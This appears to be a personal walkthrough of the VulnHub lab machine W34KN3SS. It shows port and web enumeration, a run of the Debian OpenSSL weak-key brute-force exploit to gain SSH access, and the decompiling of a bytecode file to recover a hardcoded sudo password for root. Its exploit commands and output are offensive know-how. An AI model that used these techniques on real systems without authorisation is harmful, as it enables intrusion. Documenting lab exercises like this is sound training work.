# Ports Scan & Enumeration
## Ports Scan
- hostname weakness.jth
```bash
nmap -Pn -p22,53,80,443 -A 192.168.20.6
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-25 16:15 CST
Nmap scan report for 192.168.20.6
Host is up (0.0014s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 de:89:a2:de:45:e7:d6:3d:ef:e9:bd:b4:b6:68:ca:6d (RSA)
|   256 1d:98:4a:db:a2:e0:cc:68:38:93:d0:52:2a:1a:aa:96 (ECDSA)
|_  256 3d:8a:6b:92:0d:ba:37:82:9e:c3:27:18:b6:01:cd:98 (ED25519)
53/tcp  open  domain?
80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| ssl-cert: Subject: commonName=weakness.jth/organizationName=weakness.jth/stateOrProvinceName=Jordan/countryName=jo
| Not valid before: 2018-05-05T11:12:54
|_Not valid after:  2019-05-05T11:12:54
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.28 seconds
````

## Web Service Enumeration
### Port 80
- nikto
```bash
nikto -host 192.168.20.6
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.20.6
+ Target Hostname:    192.168.20.6
+ Target Port:        80
+ Start Time:         2021-04-25 16:18:29 (GMT8)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x2aa6 0x56b7369530642
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: POST, OPTIONS, HEAD, GET
+ OSVDB-3092: /test/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
^[[A+ 7535 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2021-04-25 16:18:48 (GMT8) (19 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

- gobuster
```bash
gobuster dir -u http://192.168.20.6 -w /opt/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,htm,html,php,asp,aspx,jsp
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.20.6
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              jsp,txt,htm,html,php,asp,aspx
[+] Timeout:                 10s
===============================================================
2021/04/25 16:21:58 Starting gobuster in directory enumeration mode
===============================================================
/blog                 (Status: 301) [Size: 311] [--> http://192.168.20.6/blog/]
/index.html           (Status: 200) [Size: 10918]
/uploads              (Status: 301) [Size: 314] [--> http://192.168.20.6/uploads/]
/upload.php           (Status: 200) [Size: 216]
/test                 (Status: 301) [Size: 311] [--> http://192.168.20.6/test/]
/server-status        (Status: 403) [Size: 300]

===============================================================
2021/04/25 16:40:45 Finished
===============================================================
```

### Port 443
- nikto
	- Name: Jordan Amman
	- Mail: n30@weakness.jth
```bash
nikto -host 192.168.20.6:443
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.20.6
+ Target Hostname:    192.168.20.6
+ Target Port:        443
---------------------------------------------------------------------------
+ SSL Info:        Subject:  /C=jo/ST=Jordan/L=Amman/O=weakness.jth/CN=weakness.jth/emailAddress=n30@weakness.jth
                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
                   Issuer:   /C=jo/ST=Jordan/L=Amman/O=weakness.jth/CN=weakness.jth/emailAddress=n30@weakness.jth
+ Start Time:         2021-04-25 16:18:49 (GMT8)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x2aa6 0x56b7369530642
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Hostname '192.168.20.6' does not match certificate's names: weakness.jth
+ The Content-Encoding header is set to "deflate" this may mean that the server is vulnerable to the BREACH attack.
+ Allowed HTTP Methods: POST, OPTIONS, HEAD, GET
+ OSVDB-3092: /test/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7535 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2021-04-25 16:19:58 (GMT8) (69 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

- gobuster
```bash
gobuster dir -u https://192.168.20.6 -w /opt/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,htm,html,php,asp,aspx,jsp -k
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://192.168.20.6
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,htm,html,php,asp,aspx,jsp
[+] Timeout:                 10s
===============================================================
2021/04/25 16:22:05 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10918]
/blog                 (Status: 301) [Size: 313] [--> https://192.168.20.6/blog/]
/uploads              (Status: 301) [Size: 316] [--> https://192.168.20.6/uploads/]
/upload.php           (Status: 200) [Size: 216]
/test                 (Status: 301) [Size: 313] [--> https://192.168.20.6/test/]
/server-status        (Status: 403) [Size: 301]

===============================================================
2021/04/25 16:41:02 Finished
===============================================================
```

- Looks like that port 80 and 443 are serve very same web site. We will explore more by web browser.

# Web Service
[../GlasgowSmile/GlasgowSmile](../GlasgowSmile/GlasgowSmile.md)
- /uploads folder is empty, but we should have at least rw permission on it.
- /upload.php is file upload function.
- /test:    it's all about keys
- /blog is listable empty folder

## /upload.php
- after I made an sh3ll.php and try to upload, I got this:
![](Pasted%20image%2020210425165632.png)
- the code says
```bash
echo 'V0UgSlVTVCBURVNUIFRISVMgU0NSSVBUV0UgSlVTVCBURVNUIFRISVMgU0NSSVBUIEFHQUlOIDpE' | base64 -d

WE JUST TEST THIS SCRIPTWE JUST TEST THIS SCRIPT AGAIN :D
```

- Check the source page, not everything I saw was real? Upload is just an illusion?
![](Pasted%20image%2020210425165848.png)

- Copy and checked this b64 coded jpg found nothing interesting
```bash
┌[ChanninNicosMBP]─[16:54-25/04]─[/Users/cn/Documents/Writeups/VulnHub/W34KN3SS]
└╼cn$ vim matrix

┌[ChanninNicosMBP]─[17:02-25/04]─[/Users/cn/Documents/Writeups/VulnHub/W34KN3SS]
└╼cn$ mv matrix matrix_b64

┌[ChanninNicosMBP]─[17:02-25/04]─[/Users/cn/Documents/Writeups/VulnHub/W34KN3SS]
└╼cn$ cat matrix_b64 | base64 -d > matrix

┌[ChanninNicosMBP]─[17:03-25/04]─[/Users/cn/Documents/Writeups/VulnHub/W34KN3SS]
└╼cn$ file matrix
matrix: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, baseline, precision 8, 800x600, components 3

┌[ChanninNicosMBP]─[17:03-25/04]─[/Users/cn/Documents/Writeups/VulnHub/W34KN3SS]
└╼cn$ mv matrix matrix.jpg

┌[ChanninNicosMBP]─[17:03-25/04]─[/Users/cn/Documents/Writeups/VulnHub/W34KN3SS]
└╼cn$ exiftool matrix.jpg
ExifTool Version Number         : 12.16
File Name                       : matrix.jpg
Directory                       : .
File Size                       : 175 KiB
File Modification Date/Time     : 2021:04:25 17:03:07+08:00
File Access Date/Time           : 2021:04:25 17:03:19+08:00
File Inode Change Date/Time     : 2021:04:25 17:03:17+08:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 72
Y Resolution                    : 72
Image Width                     : 800
Image Height                    : 600
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 800x600
Megapixels                      : 0.480

┌[ChanninNicosMBP]─[17:03-25/04]─[/Users/cn/Documents/Writeups/VulnHub/W34KN3SS]
└╼cn$ binwalk matrix.jpg

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
```


## weakness.jth
- Alright, after a little bit struglling, I recall that I access all the web pages by ip address, but I did find hostname. 
![](Pasted%20image%2020210425172936.png)
- So I scanned web site by http://weakness.jth, and I do find something
```bash
gobuster dir -u http://weakness.jth/ -w /opt/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,htm,html,php,asp,aspx,jsp
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://weakness.jth/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              htm,html,php,asp,aspx,jsp,txt
[+] Timeout:                 10s
===============================================================
2021/04/25 17:30:33 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 526]
/private              (Status: 301) [Size: 314] [--> http://weakness.jth/private/]
/robots.txt           (Status: 200) [Size: 14]
/server-status        (Status: 403) [Size: 300]

===============================================================
2021/04/25 17:40:10 Finished
===============================================================
```

- /robots.txt says `Forget it!`, OK.
- /private do give us some juice.
![](Pasted%20image%2020210425173534.png)
```bash
┌[ChanninNicosMBP]─[17:36-25/04]─[/Users/cn/Documents/Writeups/VulnHub/W34KN3SS]
└╼cn$ wget http://weakness.jth/private/mykey.pub                                               130 ⨯
--2021-04-25 17:36:21--  http://weakness.jth/private/mykey.pub
Resolving weakness.jth (weakness.jth)... 192.168.20.6
Connecting to weakness.jth (weakness.jth)|192.168.20.6|:80... connected.
HTTP request sent, awaiting response... 404 Not Found
2021-04-25 17:36:21 ERROR 404: Not Found.


┌[ChanninNicosMBP]─[17:36-25/04]─[/Users/cn/Documents/Writeups/VulnHub/W34KN3SS]
└╼cn$ wget http://weakness.jth/private/files/mykey.pub                                           8 ⨯
--2021-04-25 17:36:41--  http://weakness.jth/private/files/mykey.pub
Resolving weakness.jth (weakness.jth)... 192.168.20.6
Connecting to weakness.jth (weakness.jth)|192.168.20.6|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 400
Saving to: ‘mykey.pub’

mykey.pub                 100%[==================================>]     400  --.-KB/s    in 0s

2021-04-25 17:36:41 (42.4 MB/s) - ‘mykey.pub’ saved [400/400]


┌[ChanninNicosMBP]─[17:36-25/04]─[/Users/cn/Documents/Writeups/VulnHub/W34KN3SS]
└╼cn$ wget http://weakness.jth/private/files/notes.txt
--2021-04-25 17:36:53--  http://weakness.jth/private/files/notes.txt
Resolving weakness.jth (weakness.jth)... 192.168.20.6
Connecting to weakness.jth (weakness.jth)|192.168.20.6|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 43 [text/plain]
Saving to: ‘notes.txt’

notes.txt                 100%[==================================>]      43  --.-KB/s    in 0s

2021-04-25 17:36:53 (2.05 MB/s) - ‘notes.txt’ saved [43/43]


┌[ChanninNicosMBP]─[17:36-25/04]─[/Users/cn/Documents/Writeups/VulnHub/W34KN3SS]
└╼cn$ cat notes.txt
this key was generated by openssl 0.9.8c-1
```

- This matches the clue about "keys", now we have the key of specific version, should have some exploit.
	- https://www.exploit-db.com/exploits/5720
	- since this exploit did request a valid username, and then I recall I did have one from the mailbox: `n30`
```bash
┌[ChanninNicosMBP]─[18:01-25/04]─[/Users/cn/Documents/Writeups/VulnHub/W34KN3SS]
└╼cn$ ssh 192.168.20.6                                                                         130 ⨯
The authenticity of host '192.168.20.6 (192.168.20.6)' can't be established.
ECDSA key fingerprint is SHA256:FTdaO229JeXut53RKWWYP4l8cnqYel7GvYcdUsCXAqQ.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.20.6' (ECDSA) to the list of known hosts.
cn@192.168.20.6's password:


┌[ChanninNicosMBP]─[18:01-25/04]─[/Users/cn/Documents/Writeups/VulnHub/W34KN3SS]
└╼cn$ python2 5720.py rsa/2048/ 192.168.20.6 n30 22 5                                          130 ⨯

-OpenSSL Debian exploit- by ||WarCat team|| warcat.no-ip.org
Tested 204 keys | Remaining 32564 keys | Aprox. Speed 40/sec
Tested 400 keys | Remaining 32368 keys | Aprox. Speed 39/sec
...[snip]...
Tested 16026 keys | Remaining 16742 keys | Aprox. Speed 38/sec
Tested 16183 keys | Remaining 16585 keys | Aprox. Speed 31/sec

Key Found in file: 58df9e40959666346f106e21cc1909a2-11625
Execute: ssh -ln30 -p22 -i rsa/2048//58df9e40959666346f106e21cc1909a2-11625 192.168.20.6


Key Found in file: 53f652c0380c9d4e1752a115a76eab55-6522
Execute: ssh -ln30 -p22 -i rsa/2048//53f652c0380c9d4e1752a115a76eab55-6522 192.168.20.6


Key Found in file: 055c9ab9822f2b9e130983cdcea829c0-23107
Execute: ssh -ln30 -p22 -i rsa/2048//055c9ab9822f2b9e130983cdcea829c0-23107 192.168.20.6


Key Found in file: 7b6f41a1e259dd03476d45c1d0c99032-29490
Execute: ssh -ln30 -p22 -i rsa/2048//7b6f41a1e259dd03476d45c1d0c99032-29490 192.168.20.6


Key Found in file: 4161de56829de2fe64b9055711f531c1-2537
Execute: ssh -ln30 -p22 -i rsa/2048//4161de56829de2fe64b9055711f531c1-2537 192.168.20.6

Tested 16183 keys | Remaining 16585 keys | Aprox. Speed 0/sec
```

- Wow, and it worked like magic
```bash
┌[ChanninNicosMBP]─[18:08-25/04]─[/Users/cn/Documents/Writeups/VulnHub/W34KN3SS]
└╼cn$ ssh -ln30 -p22 -i rsa/2048//53f652c0380c9d4e1752a115a76eab55-6522 192.168.20.6
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Tue Aug 14 13:29:20 2018 from 192.168.209.1
n30@W34KN3SS:~$ id
uid=1000(n30) gid=1000(n30) groups=1000(n30),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)
```

- And one more interesting thing is the keys exploit will change after victim host reboot, so it will request another 5720 attack to get the pub keys.
```bash
...[victim host reboot]...

┌[ChanningNicos-MacBook-Pro]─[13:58-28/04]─[/Users/cn/Documents/Writeups/VulnHub/W34KN3SS]
└╼cn$ ssh -ln30 -p22 -i rsa/2048/53f652c0380c9d4e1752a115a76eab55-6522 192.168.20.6
n30@192.168.20.6's password:


┌[ChanningNicos-MacBook-Pro]─[13:58-28/04]─[/Users/cn/Documents/Writeups/VulnHub/W34KN3SS]
└╼cn$ python2 5720.py rsa/2048/ 192.168.20.6 n30 22 5                                                                                                                                                 130 ⨯

-OpenSSL Debian exploit- by ||WarCat team|| warcat.no-ip.org
Tested 201 keys | Remaining 32567 keys | Aprox. Speed 40/sec
Tested 400 keys | Remaining 32368 keys | Aprox. Speed 39/sec
...[snip]...
Key Found in file: 055c9ab9822f2b9e130983cdcea829c0-23107
Execute: ssh -ln30 -p22 -i rsa/2048//055c9ab9822f2b9e130983cdcea829c0-23107 192.168.20.6


Key Found in file: 58df9e40959666346f106e21cc1909a2-11625
Execute: ssh -ln30 -p22 -i rsa/2048//58df9e40959666346f106e21cc1909a2-11625 192.168.20.6


Key Found in file: 176673da90604f5f37de99f10a41de57-27079
Execute: ssh -ln30 -p22 -i rsa/2048//176673da90604f5f37de99f10a41de57-27079 192.168.20.6


Key Found in file: 4161de56829de2fe64b9055711f531c1-2537
Execute: ssh -ln30 -p22 -i rsa/2048//4161de56829de2fe64b9055711f531c1-2537 192.168.20.6


Key Found in file: 2e62e82a5bcee03b421fa58f8de407b2-28072
Execute: ssh -ln30 -p22 -i rsa/2048//2e62e82a5bcee03b421fa58f8de407b2-28072 192.168.20.6

Tested 16185 keys | Remaining 16583 keys | Aprox. Speed 10/sec

┌[ChanningNicos-MacBook-Pro]─[14:06-28/04]─[/Users/cn/Documents/Writeups/VulnHub/W34KN3SS]
└╼cn$ ssh -ln30 -p22 -i rsa/2048//4161de56829de2fe64b9055711f531c1-2537 192.168.20.6
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sun Apr 25 22:28:44 2021 from 192.168.20.1
n30@W34KN3SS:~$
```

# Post Enumeration & Privesc
- We got in by [10 - Web Service](10%20-%20Web%20Service.md)
## Post Enumeration
### n30
```bash
n30@W34KN3SS:~$ ls -al
total 44
drwxr-xr-x 5 n30  n30  4096 Aug 14  2018 .
drwxr-xr-x 3 root root 4096 May  5  2018 ..
-rw------- 1 n30  n30    25 Aug 14  2018 .bash_history
-rw-r--r-- 1 n30  n30   220 May  5  2018 .bash_logout
-rw-r--r-- 1 n30  n30  3771 May  5  2018 .bashrc
drwx------ 2 n30  n30  4096 May  5  2018 .cache
drwxrwxr-x 3 n30  n30  4096 May  5  2018 .local
-rw-r--r-- 1 n30  n30   818 May  7  2018 .profile
drwxrwxr-x 2 n30  n30  4096 May  5  2018 .ssh
-rw-r--r-- 1 n30  n30     0 May  5  2018 .sudo_as_admin_successful
-rwxrwxr-x 1 n30  n30  1138 May  8  2018 code
-rw-rw-r-- 1 n30  n30    33 May  8  2018 user.txt
n30@W34KN3SS:~$ grep bash /etc/passwd
#root:x:0:0:root:/root:/bin/bash
root::0:0:root:/root:/bin/bash
n30:x:1000:1000:n30,,,:/home/n30:/bin/bash
n30@W34KN3SS:~$ cat user.txt
25e3cd678875b601425c9356c8039f68
n30@W34KN3SS:~$ cat code
�
^��Zc@sXddlZddlZddlZddlZdjej��GHdGHdGHdZeed��7Zeed��7Zee��7Zeed	��7Zeed
��7Zeed
       ��7Zeed
��7Zeed��7Zeed��7Zeed��7Zeed��7Zeed��7Zeed��7Zeed��7Zeed��7Zeed��7Zeed��7Zeed��7Zeed��7Zeed��7Zej	eej��j
�Z
  dje
     �GHdGHdS(i����Ns[+]System Started at : {0}sG[+]This binary should generate unique hash for the hardcoded login infos[+]Generating the hash ..ttnt3t0t:tdtMtAtStDtNtBt!t#s[+]Your new hash is : {0}s[+]Done(
      tostsocketttimethashlibtformattctimetinftchrtordtsha256t	hexdigestthashf(((scode.py<module>s>



                                                                                          n30@W34KN3SS:~$ file code
code: python 2.7 byte-compiled
```


### linpeas.sh
1. n30 is sudo user.
```bash
User & Groups: uid=1000(n30) gid=1000(n30) groups=1000(n30),4(adm),24(cdrom),27(`sudo`),30(dip),46(plugdev),111(lpadmin),112(sambashare)
Sudo version 1.8.21p2
```
- we do find an exploit of sudo 1.8.21p2, but it required cc and socat which are not exist on target machine:
	- https://exploit-db.com/exploits/48052
	- tried compile on attacker box and download everything to victim box and run, but not work.
2. program ./code
- There's nothing more from linpeas.sh, so my guess is this code is something we should study with
```bash
n30@W34KN3SS:~$ ls -l
total 8
-rwxrwxr-x 1 n30 n30 1138 May  8  2018 code
-rw-rw-r-- 1 n30 n30   33 May  8  2018 user.txt

n30@W34KN3SS:~$ file code
code: python 2.7 byte-compiled
n30@W34KN3SS:~$ ./code
./code: line 1: $'\003\363\r': command not found
./code: line 2: $'^\307\361Zc\004@sX\002dd\001lZdd\001l\001Z\001dd\001l\002Z\002dd\001l\003Z\003d\002j\004e\002j\005\203\203\001GHd\003GHd\004GHd\005Z\006e\006e\ae\bd\006\203\001\203\0017Z\006e\006e\ae\bd\a\203\001\203\0017Z\006e\006e\ae\bd\b\203\001\203\0017Z\006e\006e\ae\bd': command not found
./code: line 3: $'\203\001\203\0017Z\006e\006e\ae\bd\v\203\001\203\0017Z\006e\006e\ae\bd\f\203\001\203\0017Z\006e\006e\ae\bd\r\203\001\203\0017Z\006e\006e\ae\bd\016\203\001\203\0017Z\006e\006e\ae\bd\017\203\001\203\0017Z\006e\006e\ae\bd\020\203\001\203\0017Z\006e\006e\ae\bd\021\203\001\203\0017Z\006e\006e\ae\bd\021\203\001\203\0017Z\006e\006e\ae\bd\022\203\001\203\0017Z\006e\006e\ae\bd\020\203\001\203\0017Z\006e\006e\ae\bd\021\203\001\203\0017Z\006e\006e\ae\bd\022\203\001\203\0017Z\006e\006e\ae\bd\021\203\001\203\0017Z\006e\006e\ae\bd\022\203\001\203\0017Z\006e\006e\ae\bd\a\203\001\203\0017Z\006e\006e\ae\bd\a\203\001\203\0017Z\006e\003j': command not found
./code: line 4: syntax error near unexpected token `$'\025i\377\377\377\377Ns\032[+]System''
./code: line 4: `�Z
                   dje
                      �GHdGHdS(i����Ns[+]System Started at : {0}sG[+]This binary should generate unique hash for the hardcoded login infos[+]Generating the hash ..ttnt3t0t:tdtMtAtStDtNtBt!t#s[+]Your new hash is : {0}s[+]Done(
                       tostsocketttimethashlibtformattctimetinftchrtordtsha256t	hexdigestthashf(((scode.py<module>s>



               '
n30@W34KN3SS:~$ python code
[+]System Started at : Wed Apr 28 18:45:21 2021
[+]This binary should generate unique hash for the hardcoded login info
[+]Generating the hash ..
[+]Your new hash is : b7059f59848845bc3eb1eb7f579891ff0a9fa9411633694ab87addda4fe27b04
[+]Done
```

- Since the victim box has not strings or ltrace, I copied it to my attacker box
```bash
└╼cn$ strings code
[+]System Started at : {0}sG
[+]This binary should generate unique hash for the hardcoded login infos
[+]Generating the hash ..t
[+]Your new hash is : {0}s
[+]Done(

sockett
timet
hashlibt
formatt
ctimet
inft
chrt
ordt
sha256t
hexdigestt
hashf(
code.pyt
<module>
```

- what hardcoded login info? The hash is 64 bits, is it sha256 (should be 256 bits, no?)?
```bash
n30@W34KN3SS:~$ find / -name code.pyt 2>/dev/null
n30@W34KN3SS:~$ echo 'b7059f59848845bc3eb1eb7f579891ff0a9fa9411633694ab87addda4fe27b04' | wc -c
65
```
![](Pasted%20image%2020210428160010.png)

- Seems like sha256 can be 64 bits
```bash
└╼cn$ hashid b7059f59848845bc3eb1eb7f579891ff0a9fa9411633694ab87addda4fe27b04
Analyzing 'b7059f59848845bc3eb1eb7f579891ff0a9fa9411633694ab87addda4fe27b04'
[+] Snefru-256
[+] SHA-256
[+] RIPEMD-256
[+] Haval-256
[+] GOST R 34.11-94
[+] GOST CryptoPro S-Box
[+] SHA3-256
[+] Skein-256
[+] Skein-512(256)
```

- Even it says that, it make hash by hardcoded login info, it still generate different hashes
- So, which part is hardcoded? n30 is the only login user, does the output suppose to be very same?
```bash
n30@W34KN3SS:~$ python code
[+]System Started at : Wed Apr 28 19:00:56 2021
[+]This binary should generate unique hash for the hardcoded login info
[+]Generating the hash ..
[+]Your new hash is : 791bf2fae7048264ee9e57eda2942527a185535eea843378431f7bc9e00684de
[+]Done
n30@W34KN3SS:~$ python code
[+]System Started at : Wed Apr 28 19:00:58 2021
[+]This binary should generate unique hash for the hardcoded login info
[+]Generating the hash ..
[+]Your new hash is : bbe70c5781b90096e91f65c10a396598d2bedcb82ae281b004c401cfe915183f
[+]Done
n30@W34KN3SS:~$ python code
[+]System Started at : Wed Apr 28 19:00:59 2021
[+]This binary should generate unique hash for the hardcoded login info
[+]Generating the hash ..
[+]Your new hash is : 5ff9ec2887d589ba10e561db2833f022c950b55e60522da08d0f70b7506e3682
[+]Done
n30@W34KN3SS:~$ python code
[+]System Started at : Wed Apr 28 19:01:01 2021
[+]This binary should generate unique hash for the hardcoded login info
[+]Generating the hash ..
[+]Your new hash is : f474ca12d1378a6b393ae26b1af0cbe4e110b317e54888267c436df054f412f7
[+]Done
```

- OK, recall that when strings code, we saw time and ctime function, so maybe the system time is salt in this hash.
- I'm look at the cat code or ./code output, and found there's some interesting strings:
	-	`hardcoded login infos[+]Generating the hash ..ttnt3t0t:tdtMtAtStDtNtBt!t#s[+]Your new hash is `
	-	does it looks like there's n30 with other stuff split by 't'?
	-	remove all the ts, we got this:
		-	n30:dMASDNB!#
	- then I searched dMASDNB from google, and what I saw are all writeups of this vulnhub box, this is part of n30 password!!!!

- So this is hardcoded login info. it's just I may not have the whole password.
```bash
30@W34KN3SS:~$ sudo -l
[sudo] password for n30: `dMASDNB!#`
Sorry, try again.
[sudo] password for n30:
sudo: 1 incorrect password attempt
```
- Of course I have the whole password from google already, just wonder how I can get it.
- Decompyle the code, but my system only have pip for python3.9, but uncompyle6 need 2.6 to 3.8
- Install pip for python2.7, and only extension pyc is working for uncompyle6.....
- This command is working on MacOS but disabled on Debian/Ubuntu/Kali.....

*Kali*
```bash
┌──(htb㉿kali)-[~]
└─$ sudo python2.7 -m ensurepip --default-pip
[sudo] password for htb:
ensurepip is disabled in Debian/Ubuntu for the system python.

Python modules For the system python are usually handled by dpkg and apt-get.

    apt-get install python-<module name>

Install the python-pip package to use pip itself.  Using pip together
with the system python might have unexpected results for any system installed
module, so use it on your own risk, or make sure to only use it in virtual
environments.
```

*MacOS*
```bash
└╼cn$ sudo python2.7 -m ensurepip --default-pip                                                  1 ⨯
Password:
The directory '/Users/cn/Library/Caches/pip/http' or its parent directory is not owned by the current user and the cache has been disabled. Please check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.
The directory '/Users/cn/Library/Caches/pip' or its parent directory is not owned by the current user and caching wheels has been disabled. check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.
Looking in links: /tmp/tmpzWPMga
Requirement already satisfied: setuptools in /System/Library/Frameworks/Python.framework/Versions/2.7/Extras/lib/python (41.0.1)
Collecting pip
Installing collected packages: pip
Successfully installed pip-18.1

└╼cn$ pip -V
pip 18.1 from /Library/Python/2.7/site-packages/pip (python 2.7)

╼cn$ pip3 -V
pip 21.1 from /usr/local/lib/python3.9/site-packages/pip (python 3.9)

└╼cn$ pip install uncompyle6

└╼cn$ uncompyle6 code
# file code
# path code must point to a Python source that can be compiled, or Python bytecode (.pyc, .pyo)

└╼cn$ mv code code.pyc

└╼cn$ uncompyle6 code.pyc
# uncompyle6 version 3.7.4
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.16 (default, Feb 28 2021, 12:34:25)
# [GCC Apple LLVM 12.0.5 (clang-1205.0.19.59.6) [+internal-os, ptrauth-isa=deploy
# Embedded file name: code.py
# Compiled at: 2018-05-08 23:50:54
import os, socket, time, hashlib
print ('[+]System Started at : {0}').format(time.ctime())
print '[+]This binary should generate unique hash for the hardcoded login info'
print '[+]Generating the hash ..'
inf = ''
inf += chr(ord('n'))
inf += chr(ord('3'))
inf += chr(ord('0'))
inf += chr(ord(':'))
inf += chr(ord('d'))
inf += chr(ord('M'))
inf += chr(ord('A'))
inf += chr(ord('S'))
inf += chr(ord('D'))
inf += chr(ord('N'))
inf += chr(ord('B'))
inf += chr(ord('!'))
inf += chr(ord('!'))
inf += chr(ord('#'))
inf += chr(ord('B'))
inf += chr(ord('!'))
inf += chr(ord('#'))
inf += chr(ord('!'))
inf += chr(ord('#'))
inf += chr(ord('3'))
inf += chr(ord('3'))
hashf = hashlib.sha256(inf + time.ctime()).hexdigest()
print ('[+]Your new hash is : {0}').format(hashf)
print '[+]Done'
# okay decompiling code.pyc
```

- Now we have it, it's `n30:dMASDNB!!#B!#!#33`
```bash
n30@W34KN3SS:~$ sudo -l
[sudo] password for n30:
Matching Defaults entries for n30 on W34KN3SS:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User n30 may run the following commands on W34KN3SS:
    (ALL : ALL) ALL

n30@W34KN3SS:~$ sudo su -
root@W34KN3SS:~# ls -al ~
total 44
drwx------  4 root root 4096 Aug 14  2018 .
drwxr-xr-x 22 root root 4096 May  5  2018 ..
-rw-------  1 root root    6 Aug 14  2018 .bash_history
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 Aug 14  2018 .cache
drwxr-xr-x  3 root root 4096 May  5  2018 .local
-rw-------  1 root root  114 May  5  2018 .mysql_history
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-------  1 root root 1024 May  5  2018 .rnd
-rw-r--r--  1 root root   33 May  8  2018 root.txt
-rw-r--r--  1 root root   66 Aug 14  2018 .selected_editor
root@W34KN3SS:~# cat /root/root.txt
a1d2fab76ec6af9b651d4053171e042e
````




